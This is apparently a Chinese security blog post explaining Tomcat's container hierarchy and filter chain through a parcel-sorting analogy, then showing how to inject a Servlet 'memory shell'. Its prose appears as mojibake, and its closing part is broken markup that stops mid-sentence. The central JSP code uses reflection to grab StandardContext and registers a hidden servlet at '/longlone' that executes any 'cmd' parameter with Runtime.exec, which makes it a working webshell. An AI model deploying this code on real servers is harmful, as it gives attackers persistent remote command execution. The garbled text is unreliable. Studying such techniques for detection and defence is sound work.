<strong>æ”¶ä»¶åŸå¸‚</strong>ï¼ˆåŸŸåï¼‰å†³å®šå‘å¾€å“ªä¸ªåŒºåŸŸåˆ†æ‹£ä¸­å¿ƒï¼ˆHostï¼‰</li><li><strong>ä¿åº•æœºåˆ¶</strong>ï¼šå¦‚æœé‡åˆ°å†™ç€ã€Œç«æ˜Ÿå¸‚ã€è¿™ç§ä¸å­˜åœ¨çš„åœ°å€ï¼Œå°±è‡ªåŠ¨è½¬ç»™ <strong>é»˜è®¤åˆ†æ‹£ä¸­å¿ƒ</strong>ï¼ˆdefaultHostï¼‰å¤„ç†</li><li><strong>å¤šçº¿è¿è¥</strong>ï¼šå¯ä»¥ç®¡ç†åŒ—äº¬ã€ä¸Šæµ·ã€å¹¿å·ç­‰å¤šä¸ªåˆ†æ‹£ä¸­å¿ƒï¼ˆæ¯ä¸ª Host å¯¹åº”ä¸€ä¸ªåŸå¸‚ï¼‰</li></ol><p><strong>ä¸¾ä¸ªæ —å­</strong>ğŸŒ°ï¼š<br>å½“ä½ åœ¨æ·˜å®ä¸‹å•ï¼Œå¿«é€’æ€»éƒ¨åˆ†ææ”¶è´§åœ°å€æ˜¯ã€Œä¸Šæµ·å¸‚ã€ï¼Œå°±æŠŠåŒ…è£¹äº¤ç»™ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒå¤„ç†ã€‚</p><hr><h3 id="äºŒã€Hostï¼ˆè™šæ‹Ÿä¸»æœºï¼‰â€”â€”åŒºåŸŸåˆ†æ‹£ä¸­å¿ƒ"><a href="#äºŒã€Hostï¼ˆè™šæ‹Ÿä¸»æœºï¼‰â€”â€”åŒºåŸŸåˆ†æ‹£ä¸­å¿ƒ" class="headerlink" title="äºŒã€Hostï¼ˆè™šæ‹Ÿä¸»æœºï¼‰â€”â€”åŒºåŸŸåˆ†æ‹£ä¸­å¿ƒ"></a><strong>äºŒã€Hostï¼ˆè™šæ‹Ÿä¸»æœºï¼‰â€”â€”åŒºåŸŸåˆ†æ‹£ä¸­å¿ƒ</strong></h3><p><strong>æ¯”å–»</strong>ï¼šHost æ˜¯ <strong>åŸå¸‚çº§åˆ†æ‹£ä¸­å¿ƒ</strong>ï¼Œæ¯”å¦‚ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒã€åŒ—äº¬åˆ†æ‹£ä¸­å¿ƒã€‚<br><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><ol><li><strong>åœ°å€è§£æ</strong>ï¼šæ ¹æ®å¿«é€’å•ä¸Šçš„ <strong>è¯¦ç»†åœ°å€</strong>ï¼ˆURLè·¯å¾„ï¼‰ï¼Œæ‰¾åˆ°å¯¹åº”çš„å°åŒºå¿«é€’ç«™ï¼ˆContextï¼‰</li><li><strong>å¤šç«™ç®¡ç†</strong>ï¼šä¸€ä¸ªåˆ†æ‹£ä¸­å¿ƒå¯ä»¥ç®¡ç†å¤šä¸ªå¿«é€’ç«™ï¼ˆå¦‚ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒç®¡ç†æµ¦ä¸œç«™ã€è™¹æ¡¥ç«™ç­‰ï¼‰</li><li><strong>è§„åˆ™æ‰‹å†Œ</strong>ï¼šåˆ†æ‹£ä¸­å¿ƒæœ‰æœ¬ã€Šå¿«é€’å¤„ç†æŒ‡å—ã€‹ï¼ˆweb.xmlï¼‰ï¼Œå‘Šè¯‰å‘˜å·¥é‡åˆ°ä¸åŒåœ°å€æ€ä¹ˆå¤„ç†</li></ol><p><strong>ä¸¾ä¸ªæ —å­</strong>ğŸŒ°ï¼š<br>ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒæ”¶åˆ°å†™ç€ã€Œæµ¦ä¸œæ–°åŒºå¼ æ±Ÿè·¯123å·ã€çš„åŒ…è£¹ï¼ŒåŒ¹é…åˆ°å¼ æ±Ÿå¿«é€’ç«™ã€‚</p><hr><h3 id="ä¸‰ã€Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰â€”â€”å°åŒºå¿«é€’ç«™"><a href="#ä¸‰ã€Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰â€”â€”å°åŒºå¿«é€’ç«™" class="headerlink" title="ä¸‰ã€Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰â€”â€”å°åŒºå¿«é€’ç«™"></a><strong>ä¸‰ã€Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰â€”â€”å°åŒºå¿«é€’ç«™</strong></h3><p><strong>æ¯”å–»</strong>ï¼šContext å°±åƒä½ å®¶å°åŒºçš„ <strong>èœé¸Ÿé©¿ç«™</strong>ï¼Œç®¡ç†ç€æœ¬å°åŒºçš„æ‰€æœ‰å¿«é€’ã€‚<br><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><ol><li><strong>åŒ…è£¹åˆ†ç±»</strong>ï¼šé©¿ç«™æ ¹æ®å¿«é€’å•å·ï¼ˆURLè·¯å¾„ï¼‰æŠŠåŒ…è£¹åˆ†ç»™ä¸åŒå¿«é€’å‘˜ï¼ˆServletï¼‰</li><li><strong>èµ„æºç®¡ç†</strong>ï¼šé©¿ç«™æœ‰è´§æ¶ï¼ˆServletå®¹å™¨ï¼‰ã€ç›‘æ§ç³»ç»Ÿï¼ˆListenerï¼‰ã€æ¶ˆæ¯’è®¾å¤‡ï¼ˆFilterï¼‰ç­‰å…¨å¥—è®¾æ–½</li><li><strong>åº”æ€¥å¤„ç†</strong>ï¼šå¦‚æœé‡åˆ°æ²¡æœ‰æ ‡æ³¨å¿«é€’å‘˜çš„åŒ…è£¹ï¼Œå°±æŒ‰ã€Šé»˜è®¤æ´¾é€è§„åˆ™ã€‹ï¼ˆweb.xmlï¼‰å¤„ç†</li></ol><p><strong>ä¸¾ä¸ªæ —å­</strong>ğŸŒ°ï¼š<br>å¼ æ±Ÿé©¿ç«™æ”¶åˆ°æ ‡æ³¨ã€Œ3æ ‹502ç‹å…ˆç”Ÿã€çš„åŒ…è£¹ï¼Œäº¤ç»™è´Ÿè´£3æ ‹çš„å¿«é€’å‘˜å°ç‹ã€‚</p><hr><h3 id="å››ã€Wrapperï¼ˆåŒ…è£…å™¨ï¼‰â€”â€”å¿«é€’å‘˜"><a href="#å››ã€Wrapperï¼ˆåŒ…è£…å™¨ï¼‰â€”â€”å¿«é€’å‘˜" class="headerlink" title="å››ã€Wrapperï¼ˆåŒ…è£…å™¨ï¼‰â€”â€”å¿«é€’å‘˜"></a><strong>å››ã€Wrapperï¼ˆåŒ…è£…å™¨ï¼‰â€”â€”å¿«é€’å‘˜</strong></h3><p><strong>æ¯”å–»</strong>ï¼šWrapper å°±æ˜¯ <strong>è´Ÿè´£é€è´§çš„å¿«é€’å°å“¥</strong>ï¼Œæ¯ä¸ªå°å“¥ä¸“é€ä¸€æ ‹æ¥¼ã€‚<br><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><ol><li><strong>ä¸“å±æœåŠ¡</strong>ï¼šæ¯ä¸ªå¿«é€’å‘˜åªè´Ÿè´£ç‰¹å®šæ¥¼æ ‹ï¼ˆä¸€ä¸ª Wrapper å¯¹åº”ä¸€ä¸ª Servlet ç±»ï¼‰  </li><li><strong>å…¨æµç¨‹ç®¡ç†</strong>ï¼šä»æ¥å•â†’å–è´§â†’é€è´§â†’ç­¾æ”¶ï¼ˆServlet çš„ init()â†’service()â†’destroy()ï¼‰å…¨ç¨‹è·Ÿè¿›</li><li><strong>ä¸å¯åˆ†å‰²</strong>ï¼šå¿«é€’å‘˜ä¸èƒ½æŠŠè‡ªå·±çš„ç‰‡åŒºå†åˆ†åŒ…ç»™åˆ«äººï¼ˆWrapper ä¸èƒ½æœ‰å­å®¹å™¨ï¼‰</li></ol><p><strong>ä¸¾ä¸ªæ —å­</strong>ğŸŒ°ï¼š<br>å¿«é€’å‘˜å°ç‹æ¥åˆ°3æ ‹502çš„è®¢å•ï¼Œä»é©¿ç«™å–ä»¶â†’é€è´§â†’è®©å®¢æˆ·ç­¾æ”¶ã€‚</p><hr><h3 id="äº”ã€å››è€…åä½œæµç¨‹å›¾"><a href="#äº”ã€å››è€…åä½œæµç¨‹å›¾" class="headerlink" title="äº”ã€å››è€…åä½œæµç¨‹å›¾"></a><strong>äº”ã€å››è€…åä½œæµç¨‹å›¾</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµè§ˆå™¨ä¸‹å• â†’ æ€»å…¬å¸(Engine) â†’ ä¸Šæµ·åˆ†æ‹£ä¸­å¿ƒ(Host) â†’ å¼ æ±Ÿé©¿ç«™(Context) â†’ 3æ ‹å¿«é€’å‘˜(Wrapper)</span><br><span class="line">       â†“           â†“               â†“               â†“</span><br><span class="line">    HTTPè¯·æ±‚ â†’ æŒ‰åŸŸååˆ†å‘ â†’ æŒ‰URLè·¯å¾„åŒ¹é… â†’ æ‰§è¡ŒServleté€»è¾‘</span><br></pre></td></tr></table></figure><hr><h3 id="å…­ã€ä¸€å¥è¯æ€»ç»“"><a href="#å…­ã€ä¸€å¥è¯æ€»ç»“" class="headerlink" title="å…­ã€ä¸€å¥è¯æ€»ç»“"></a><strong>å…­ã€ä¸€å¥è¯æ€»ç»“</strong></h3><p>â€¢ <strong>Engine</strong> æ˜¯çœ‹å¿«é€’å• <strong>æ”¶ä»¶åŸå¸‚</strong> çš„æ€»è°ƒåº¦<br>â€¢ <strong>Host</strong> æ˜¯æŒ‰ <strong>è¯¦ç»†åœ°å€</strong> æ‰¾å¿«é€’ç«™çš„å¯¼èˆªä»ª<br>â€¢ <strong>Context</strong> æ˜¯ç®¡ç† <strong>å°åŒºå†…æ‰€æœ‰å¿«é€’</strong> çš„é©¿ç«™<br>â€¢ <strong>Wrapper</strong> æ˜¯è´Ÿè´£ <strong>é€è´§åˆ°é—¨</strong> çš„å¿«é€’å°å“¥  </p><p>å°±åƒå¿«é€’ç½‘ç»œéœ€è¦å±‚å±‚åˆ†æ‹£ï¼ŒTomcat é€šè¿‡è¿™å››å±‚å®¹å™¨ç²¾å‡†è·¯ç”±æ¯ä¸ªè¯·æ±‚</p><p>å…¶ä¸­webappsæ–‡ä»¶å¤¹å³æ˜¯æˆ‘ä»¬çš„Hostï¼Œwebappsä¸­çš„æ–‡ä»¶å¤¹(å¦‚examples&#x2F;ROOT)ä»£è¡¨ä¸€ä¸ªContextï¼Œæ¯ä¸ªContextå†…åŒ…å«Wrapperï¼ŒWrapper åˆ™è´Ÿè´£ç®¡ç†å®¹å™¨å†…çš„ Servletã€‚</p><p>å› ä¸ºè¿™é‡Œé…ç½®ç¯å¢ƒæœ‰ç‚¹éº»çƒ¦æˆ‘ç›´æ¥æ‹¿æ–‡ç« è¿›è¡Œ</p><p>è§£é‡Šä¸‹Servletçš„ç”Ÿå‘½å‘¨æœŸ</p><h2 id="Servletåˆå§‹åŒ–æµç¨‹åˆ†"><a href="#Servletåˆå§‹åŒ–æµç¨‹åˆ†" class="headerlink" title="Servletåˆå§‹åŒ–æµç¨‹åˆ†"></a>Servletåˆå§‹åŒ–æµç¨‹åˆ†</h2><ol><li>é€šè¿‡ context.createWapper() åˆ›å»º Wapper å¯¹è±¡</li><li>è®¾ç½® Servlet çš„ LoadOnStartUp çš„å€¼(åç»­åˆ†æä¸ºä»€ä¹ˆåŠ¨æ€æ³¨å†ŒServletéœ€è¦è®¾ç½®è¯¥å±æ€§)</li><li>è®¾ç½® Servlet çš„ Name</li><li>è®¾ç½® Servlet å¯¹åº”çš„ Class</li><li>å°† Servlet æ·»åŠ åˆ° context çš„ children ä¸­</li><li>å°† url è·¯å¾„å’Œ servlet ç±»åšæ˜ å°„</li></ol><h2 id="å†…å­˜é©¬å®ç°æµç¨‹åˆ†æ"><a href="#å†…å­˜é©¬å®ç°æµç¨‹åˆ†æ" class="headerlink" title="å†…å­˜é©¬å®ç°æµç¨‹åˆ†æ#"></a>å†…å­˜é©¬å®ç°æµç¨‹åˆ†æ<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">#</a></h2><p>æ ¹æ®ä¸Šè¿°çš„æµç¨‹åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡ä»¿ä¸Šè¿°çš„åŠ è½½æœºåˆ¶æ‰‹åŠ¨æ³¨å†Œä¸€ä¸ªservlet:</p><ol><li><p>æ‰¾åˆ°StandardContext</p></li><li><p>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„servlet</p></li><li><p>é€šè¿‡ context.createWapper() åˆ›å»º Wapper å¯¹è±¡</p></li><li><p>è®¾ç½® Servlet çš„ LoadOnStartUp çš„å€¼</p></li><li><p>è®¾ç½® Servlet çš„ Name</p></li><li><p>è®¾ç½® Servlet å¯¹åº”çš„ Class</p></li><li><p>å°† Servlet æ·»åŠ åˆ° context çš„ children ä¸­</p></li><li><p>å°† url è·¯å¾„å’Œ servlet ç±»åšæ˜ å°„</p><p>leran from:<a href="https://www.cnblogs.com/erosion2020/p/18575039">https://www.cnblogs.com/erosion2020/p/18575039</a></p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">S</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">â€‹        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">â€‹        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">â€‹        <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">â€‹            <span class="keyword">try</span> &#123;</span><br><span class="line">â€‹                Runtime.getRuntime().exec(cmd);</span><br><span class="line">â€‹            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">â€‹        &#125;</span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">â€‹        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="meta">@Override</span></span><br><span class="line">â€‹    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">â€‹    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// ServletContext servletContext =  request.getServletContext();</span></span><br><span class="line">    <span class="comment">// Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line">    <span class="comment">// appctx.setAccessible(true);</span></span><br><span class="line">    <span class="comment">// ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span></span><br><span class="line">    <span class="comment">// Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line">    <span class="comment">// stdctx.setAccessible(true);</span></span><br><span class="line">    <span class="comment">// StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›´ç®€å•çš„æ–¹æ³• è·å–StandardContext</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line"><span class="type">S</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">S</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> servlet.getClass().getSimpleName();</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">newWrapper.setName(name);</span><br><span class="line">newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">newWrapper.setServlet(servlet);</span><br><span class="line">newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">standardContext.addChild(newWrapper);</span><br><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/longlone&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>Servlet å†…å­˜é©¬</strong> å¹¶ä¸æ˜¯ â€œçº¯ç²¹â€ çš„å†…å­˜é©¬ï¼Œå®ƒå¹¶æ²¡æœ‰å®Œå…¨è¾¾åˆ°å†…å­˜é©¬çš„æ— æ–‡ä»¶è½åœ°çš„ç‰¹ç‚¹ã€‚ç¡®å®ï¼Œ<strong>å†…å­˜é©¬çš„åŸå§‹æ„å›¾</strong>æ˜¯é€šè¿‡ä»…åœ¨å†…å­˜ä¸­è¿è¡Œï¼Œé¿å…æ–‡ä»¶ç³»ç»Ÿçš„å­˜åœ¨æˆ–ç—•è¿¹ï¼Œä½†é€šè¿‡ JSP æ–‡ä»¶æˆ–å…¶ä»–å½¢å¼çš„æ¶æ„æ–‡ä»¶è½½å…¥å’Œè§¦å‘ï¼Œ<strong>Servlet å†…å­˜é©¬</strong>ä»ç„¶éœ€è¦ä¾èµ–äºåˆå§‹çš„æ–‡ä»¶è½åœ°å’Œ Tomcat é‡æ–°åŠ è½½ã€‚è¿™ä½¿å¾—å®ƒä¸ä¼ ç»Ÿçš„å†…å­˜é©¬ï¼ˆå®Œå…¨åœ¨å†…å­˜ä¸­æ‰§è¡Œï¼Œä¸ä¾èµ–äºæ–‡ä»¶ï¼‰æœ‰æ‰€ä¸åŒã€‚</p></li></ol><h1 id="Tomcat-Filter"><a href="#Tomcat-Filter" class="headerlink" title="Tomcat-Filter"></a>Tomcat-Filter</h1><p>æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹åœ¨Tomcatä¸­ä¸Filterå¯†åˆ‡ç›¸å…³çš„å‡ ä¸ªç±»:<br>- FilterDefsï¼šå­˜æ”¾FilterDefçš„æ•°ç»„ ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ï¼Œä½œç”¨ url ç­‰åŸºæœ¬ä¿¡æ¯<br>- FilterConfigsï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯<br>- FilterMapsï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern<br>- FilterChainï¼šè¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„ doFilter æ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„ Filter<br>- WebXmlï¼šå­˜æ”¾ web.xml ä¸­å†…å®¹çš„ç±»<br>- ContextConfigï¼šWebåº”ç”¨çš„ä¸Šä¸‹æ–‡é…ç½®ç±»<br>- StandardContextï¼šContextæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Context ä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapper<br>- StandardWrapperValveï¼šä¸€ä¸ª Wrapper çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Wrapper ä»£è¡¨ä¸€ä¸ªServlet</p><hr><h3 id="ä¸€ã€å…³é”®è§’è‰²å¯¹ç…§è¡¨"><a href="#ä¸€ã€å…³é”®è§’è‰²å¯¹ç…§è¡¨" class="headerlink" title="ä¸€ã€å…³é”®è§’è‰²å¯¹ç…§è¡¨"></a><strong>ä¸€ã€å…³é”®è§’è‰²å¯¹ç…§è¡¨</strong></h3><table><thead><tr><th><strong>Tomcatç±»</strong></th><th><strong>å¿«é€’åˆ†æ‹£ä¸­å¿ƒæ¯”å–»</strong></th><th><strong>æ ¸å¿ƒä½œç”¨</strong></th></tr></thead><tbody><tr><td><strong>FilterDefs</strong></td><td>åˆ†æ‹£å‘˜æ¡£æ¡ˆåº“ ğŸ“</td><td>å­˜æ‰€æœ‰åˆ†æ‹£å‘˜ï¼ˆFilterï¼‰çš„èº«ä»½è¯ï¼ˆåç§°ã€ç±»åã€åˆå§‹åŒ–å‚æ•°ï¼‰</td></tr><tr><td><strong>FilterConfigs</strong></td><td>åˆ†æ‹£å‘˜å·¥ä½œæ‰‹å†Œ ğŸ“–</td><td>å­˜åˆ†æ‹£å‘˜çš„å·¥ä½œæŒ‡å—ï¼ˆFilterå®ä¾‹ + é…ç½®ä¿¡æ¯ï¼‰</td></tr><tr><td><strong>FilterMaps</strong></td><td>åˆ†æ‹£è§„åˆ™è¡¨ ğŸ“‹</td><td>è®°å½•å“ªäº›åˆ†æ‹£å‘˜è´Ÿè´£å“ªäº›åŒºåŸŸçš„åŒ…è£¹ï¼ˆURLåŒ¹é…è§„åˆ™ï¼‰</td></tr><tr><td><strong>FilterChain</strong></td><td>åˆ†æ‹£æµæ°´çº¿ ğŸšš</td><td>æ§åˆ¶åŒ…è£¹ä¾æ¬¡ç»è¿‡å¤šä¸ªåˆ†æ‹£å‘˜å¤„ç†</td></tr><tr><td><strong>WebXml</strong></td><td>å®˜æ–¹åˆ†æ‹£è§„åˆ™æ€»çº² ğŸ“œ</td><td>ä»web.xmlé‡Œè§£æå‡ºæ¥çš„åŸå§‹è§„åˆ™ï¼ˆé™æ€é…ç½®ï¼‰</td></tr><tr><td><strong>ContextConfig</strong></td><td>åˆ†æ‹£ä¸­å¿ƒé…ç½®éƒ¨ ğŸ› ï¸</td><td>æ ¹æ®æ€»çº²ï¼ˆWebXmlï¼‰ç”Ÿæˆå®é™…çš„åˆ†æ‹£è§„åˆ™</td></tr><tr><td><strong>StandardContext</strong></td><td>åˆ†æ‹£ä¸­å¿ƒç®¡ç†ç³»ç»Ÿ ğŸ’»</td><td>ç»Ÿç­¹æ‰€æœ‰åˆ†æ‹£å‘˜ã€åŒ…è£¹æµè½¬ã€è§„åˆ™æ‰§è¡Œ</td></tr><tr><td><strong>StandardWrapperValve</strong></td><td>åŒ…è£¹æ´¾é€å‘˜ ğŸšš</td><td>æœ€ç»ˆæŠŠåŒ…è£¹é€åˆ°æ”¶ä»¶äººï¼ˆServletï¼‰æ‰‹é‡Œ</td></tr></tbody></table><hr><h3 id="äºŒã€Filterå¤„ç†æµç¨‹ï¼ˆåŒ…è£¹åˆ†æ‹£ç‰ˆï¼‰"><a href="#äºŒã€Filterå¤„ç†æµç¨‹ï¼ˆåŒ…è£¹åˆ†æ‹£ç‰ˆï¼‰" class="headerlink" title="äºŒã€Filterå¤„ç†æµç¨‹ï¼ˆåŒ…è£¹åˆ†æ‹£ç‰ˆï¼‰"></a><strong>äºŒã€Filterå¤„ç†æµç¨‹ï¼ˆåŒ…è£¹åˆ†æ‹£ç‰ˆï¼‰</strong></h3><p><strong>å‡è®¾ä¸€ä¸ªå¿«é€’ï¼ˆHTTPè¯·æ±‚ï¼‰è¿›å…¥åˆ†æ‹£ä¸­å¿ƒï¼ˆTomcatï¼‰ï¼š</strong></p><p>1ï¸âƒ£ <strong>æŸ¥åˆ†æ‹£è§„åˆ™è¡¨ï¼ˆFilterMapsï¼‰</strong><br>   â€¢ ç³»ç»Ÿæ ¹æ®å¿«é€’å•åœ°å€ï¼ˆURLè·¯å¾„ï¼‰ï¼Œä» <strong>åˆ†æ‹£è§„åˆ™è¡¨</strong> é‡Œæ‰¾å‡ºè¦ç»è¿‡å“ªäº›åˆ†æ‹£å‘˜ï¼ˆFilteré¡ºåºï¼‰<br>   â€¢ <em>æ¯”å¦‚ä¸Šæµ·çš„åŒ…è£¹è¦ç»è¿‡ï¼šå®‰æ£€å‘˜â†’æ¶ˆæ¯’å‘˜â†’åˆ†ç±»å‘˜</em></p><p>2ï¸âƒ£ <strong>ç»„è£…é…é€æµæ°´çº¿ï¼ˆFilterChainï¼‰</strong><br>   â€¢ æŒ‰æŸ¥åˆ°çš„é¡ºåºï¼ŒæŠŠå¯¹åº”çš„åˆ†æ‹£å‘˜ï¼ˆFilterï¼‰æ’æˆæµæ°´çº¿ï¼š<br>     <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">     chain = [å®‰æ£€Filter, æ¶ˆæ¯’Filter, åˆ†ç±»Filter]  </span><br><span class="line">     ```  </span><br><span class="line">   â€¢ æœ€åä¸€æ­¥äº¤ç»™æ´¾é€å‘˜ï¼ˆStandardWrapperValveï¼‰å¤„ç†  </span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ï¸âƒ£ **åˆ†æ‹£å‘˜é€ä¸ªå¤„ç†ï¼ˆdoFilterï¼‰**  </span><br><span class="line">   æ¯ä¸ªåˆ†æ‹£å‘˜æŒ‰è‡ªå·±çš„èŒè´£æ“ä½œåŒ…è£¹ï¼ˆRequest/Responseï¼‰ï¼š  </span><br><span class="line">   â€¢ **å®‰æ£€å‘˜**ï¼šæ‹†å¼€åŒ…è£¹çœ‹æœ‰æ²¡æœ‰è¿ç¦å“ï¼ˆæ£€æŸ¥è¯·æ±‚å¤´ï¼‰  </span><br><span class="line">   â€¢ **æ¶ˆæ¯’å‘˜**ï¼šç»™åŒ…è£¹å–·æ¶ˆæ¯’æ¶²ï¼ˆå‚æ•°è¿‡æ»¤ï¼‰  </span><br><span class="line">   â€¢ **åˆ†ç±»å‘˜**ï¼šè´´ä¸ŠåŒºåŸŸæ ‡ç­¾ï¼ˆæ·»åŠ å“åº”å¤´ï¼‰  </span><br><span class="line"></span><br><span class="line"><span class="number">4</span>ï¸âƒ£ **è§¦å‘ä¸‹ä¸€ç¯èŠ‚**  </span><br><span class="line">   æ¯ä¸ªåˆ†æ‹£å‘˜å¤„ç†å®Œéƒ½ä¼šå–Šï¼šâ€œä¸‹ä¸€ä¸ªï¼â€ï¼ˆè°ƒç”¨ `chain.doFilter()`ï¼‰ï¼Œç›´åˆ°ï¼š  </span><br><span class="line">   â€¢ **æ­£å¸¸æµç¨‹**ï¼šæ‰€æœ‰åˆ†æ‹£å‘˜å¤„ç†å®Œ â†’ åŒ…è£¹äº¤ç»™æ´¾é€å‘˜ï¼ˆServletï¼‰  </span><br><span class="line">   â€¢ **å¼‚å¸¸æµç¨‹**ï¼šæŸä¸ªåˆ†æ‹£å‘˜å‘ç°ç‚¸å¼¹ï¼ˆæ‹¦æˆªè¯·æ±‚ï¼‰ â†’ 